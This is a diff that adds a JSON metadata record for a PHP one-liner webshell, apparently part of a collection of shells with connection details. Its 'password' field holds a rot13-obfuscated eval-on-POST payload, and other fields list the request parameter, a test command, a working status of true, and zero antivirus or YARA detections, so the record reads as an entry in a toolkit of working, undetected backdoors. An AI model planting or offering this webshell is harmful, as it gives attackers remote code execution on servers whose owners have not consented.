@@ -1,0 +1,31 @@
+{
+    "filename": "国外某论坛不含Get,Post的pHp一句话.php",
+    "type": "php",
+    "size": 47,
+    "md5": "20ede5b8182d952728d594e6f2bb5c76",
+    "connection": {
+        "method": "POST",
+        "password": "riny($_CBFG[cntr]);",
+        "param_name": "cmd",
+        "encoding": "rot13",
+        "test_command": "echo 'test';"
+    },
+    "features": {
+        "file_upload": false,
+        "command_exec": false,
+        "database_ops": false,
+        "eval_usage": true,
+        "obfuscated": true
+    },
+    "detection": {
+        "antivirus_score": 0,
+        "yara_rules": []
+    },
+    "metadata": {
+        "discovered_date": "2025-04-25",
+        "last_tested": "2025-04-25",
+        "working_status": true,
+        "original_filename": "国外某论坛不含Get,Post的pHp一句话.php",
+        "source_path": "uncheck-shells/国外某论坛不含Get,Post的pHp一句话.php"
+    }
+}
